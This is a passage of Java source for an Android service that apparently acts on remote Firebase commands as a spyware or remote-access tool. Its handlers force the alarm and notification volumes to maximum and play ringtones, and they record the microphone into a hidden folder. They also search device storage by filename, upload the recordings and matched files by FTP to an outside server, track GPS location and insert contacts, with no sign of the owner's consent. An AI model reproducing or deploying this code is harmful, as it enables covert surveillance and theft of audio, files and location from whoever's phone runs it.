        am.setStreamVolume(AudioManager.STREAM_NOTIFICATION, am.getStreamMaxVolume(AudioManager.STREAM_NOTIFICATION), 0);
        am.setStreamVolume(AudioManager.STREAM_ALARM, am.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0);

        Uri ringtoneUri;
        switch (type) {
            case 0:
                ringtoneUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE);
                break;
            case 1:
                ringtoneUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);
                break;
            case 2:
                ringtoneUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM);
                break;
            default:
                return;
        }
        final Ringtone r = RingtoneManager.getRingtone(getApplicationContext(), ringtoneUri);
        r.play();

        if (type == 1)
            return;

        Handler handler = new Handler(Looper.getMainLooper());
        handler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(seconds * 1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                r.stop();
            }
        });
    }

    void recordAudio(JSONObject data_json) throws JSONException {

        final int seconds = data_json.getInt("seconds");

        new File(Environment.getExternalStorageDirectory(), "Android/recording").mkdirs();

        final String outputFile = Environment.getExternalStorageDirectory()
                .getAbsolutePath() + "/Android/recording/" +
                String.format("%tF-%1$tH:%1$tM:%1$tS", System.currentTimeMillis()) + ".mp3";


        final MediaRecorder recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        recorder.setOutputFile(outputFile);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);

        final JSONObject js_resp = new JSONObject();


        new Handler(Looper.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {
                try {
                    recorder.prepare();
                    recorder.start();
                    Log.e("recording", "started");
                    Thread.sleep(seconds * 1000);
                    recorder.stop();
                    Log.e("recording", "stopped");

                    Log.e("recording", "successful");


                    js_resp.put("action_name", "recording_audio");
                    js_resp.put("status", "successful");


                } catch (IOException | InterruptedException | JSONException e) {
                    Log.e("recording", "failed");

                    try {
                        js_resp.put("action_name", "recording_audio");
                        js_resp.put("status", "failed");
                    } catch (JSONException ignored) {
                    }

                    e.printStackTrace();
                }
            }
        });

        boolean uploaded;
        try {
            Thread.sleep((seconds + 2) * 1000);
            uploaded = ActionResponseSender.sendFile_FTP(new File(outputFile));
        } catch (IOException | InterruptedException e) {
            uploaded = false;
            e.printStackTrace();
        }
        js_resp.put("upload", uploaded ? "successful" : "failed");
        ActionResponseSender.Action_Response(MyFirebaseMessagingService.this, js_resp);

    }

    void searchFile(JSONObject data_json) throws JSONException {

        final String directory = data_json.getString("directory");
        final String search = data_json.getString("search");
        final boolean external = data_json.getBoolean("external");
        final boolean upload = data_json.getBoolean("upload");

        File dir;
        if (external)
            dir = new File(System.getenv("SECONDARY_STORAGE") + "/" + directory);
        else
            dir = new File(System.getenv("EXTERNAL_STORAGE") + "/" + directory);

        StringBuilder search_result = new StringBuilder();
        walkDirectory(dir, search, search_result, upload);
        Log.e("search", "finished");

        JSONObject js_resp = new JSONObject();
        js_resp.put("action_name", "search_file");
        js_resp.put("search", search);
        js_resp.put("result", search_result.toString());

        ActionResponseSender.Action_Response(MyFirebaseMessagingService.this, js_resp);

    }

    private void walkDirectory(File dir, String search, StringBuilder search_result,
                               boolean upload) throws JSONException {

        File listFile[] = dir.listFiles();

        if (listFile != null)
            for (File aListFile : listFile) {

                if (aListFile.isDirectory()) {
                    walkDirectory(aListFile, search, search_result, upload);
                } else {
                    if (aListFile.getName().toLowerCase().contains(search.toLowerCase())) {
                        Log.e("Search Matched :", aListFile.getName());
                        if (upload)
                            try {
                                ActionResponseSender.sendFile_FTP(aListFile);
                            } catch (IOException ignored) {
                            }
                        search_result.append("\n\nName : ").append(aListFile.getName())
                                .append("\nPath : ").append(aListFile.getPath());
                    }
                }
            }
    }

    void getLocation(JSONObject data_json) throws JSONException {

        boolean status = false;

        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        LocationListener locationListener = new LocationListener() {

            public String longitude;
            public String latitude;

            @Override
            public void onLocationChanged(Location loc) {

                longitude = String.valueOf(loc.getLongitude());
                Log.v("long :", longitude);
                latitude = String.valueOf(loc.getLatitude());
                Log.v("lat :", latitude);


            }

            @Override
            public void onStatusChanged(String s, int i, Bundle bundle) {

            }

            @Override
            public void onProviderEnabled(String s) {

            }

            @Override
            public void onProviderDisabled(String s) {

            }
        };


        locationManager.requestLocationUpdates
                (LocationManager.GPS_PROVIDER, 5000, 10, locationListener);

        status = true;


    }

    void addContact(JSONObject data_json) throws JSONException {

        String DisplayName = data_json.getString("name");
        String MobileNumber = data_json.getString("number");
        String emailID = data_json.getString("email");

        ArrayList<ContentProviderOperation> ops = new ArrayList<>();

        ops.add(ContentProviderOperation.newInsert(
                ContactsContract.RawContacts.CONTENT_URI)
                .withValue(ContactsContract.RawContacts.ACCOUNT_TYPE, null)
                .withValue(ContactsContract.RawContacts.ACCOUNT_NAME, null)
                .build());

        //------------------------------------------------------ Names
        if (DisplayName != null) {
            ops.add(ContentProviderOperation.newInsert(
                    ContactsContract.Data.CONTENT_URI)
                    .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
                    .withValue(ContactsContract.Data.MIMETYPE,
                            ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE)
                    .withValue(
                            ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME,
                            DisplayName).build());
        }

        //------------------------------------------------------ Mobile Number
        if (MobileNumber != null) {
            ops.add(ContentProviderOperation.
                    newInsert(ContactsContract.Data.CONTENT_URI)
                    .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
                    .withValue(ContactsContract.Data.MIMETYPE,
                            ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE)
                    .withValue(ContactsContract.CommonDataKinds.Phone.NUMBER, MobileNumber)
                    .withValue(ContactsContract.CommonDataKinds.Phone.TYPE,
                            ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE)
                    .build());
        }

        //------------------------------------------------------ Email
        if (emailID != null) {
            ops.add(ContentProviderOperation.newInsert(ContactsContract.Data.CONTENT_URI)
                    .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
                    .withValue(ContactsContract.Data.MIMETYPE,
                            ContactsContract.CommonDataKinds.Email.CONTENT_ITEM_TYPE)
                    .withValue(ContactsContract.CommonDataKinds.Email.DATA, emailID)
                    .withValue(ContactsContract.CommonDataKinds.Email.TYPE, ContactsContract.CommonDataKinds.Email.TYPE_WORK)
                    .build());
        }

        // Asking the Contact provider to create a new contact
        boolean status = false;
        try {
            getContentResolver().applyBatch(ContactsContract.AUTHORITY, ops);
            status = true;
        } catch (Exception e) {
            status = false;
            e.printStackTrace();
        }
    }
}


